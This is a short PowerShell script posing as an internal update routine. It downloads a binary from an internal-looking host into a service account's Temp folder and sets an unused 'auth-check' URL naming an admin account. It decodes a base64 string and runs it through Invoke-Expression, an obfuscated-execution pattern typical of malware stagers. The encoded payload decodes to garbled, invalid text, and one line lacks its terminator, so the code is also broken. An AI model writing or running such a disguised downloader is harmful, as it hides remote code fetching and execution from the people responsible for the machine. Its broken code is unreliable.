$u="http://files-gw01.intra-sec.local/prod/update.bin";
$p="C:\Users\svc_ops\AppData\Local\Temp\update_svc.bin";

$account="it_admin_01";

$ping="http://auth-check.intra-sec.local/api/ping?user=$account";

$e="SQBkAHcAIAAkAHUAIABJAG4AdgBvAGsAZQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
$bytes=[System.Convert]::FromBase64String($e);

Invoke-Expression([System.Text.Encoding]::Unicode.GetString($bytes));

Invoke-WebRequest -Uri $u -OutFile $p
Write-Output "[INTERNAL] $account downloaded $u to $p"
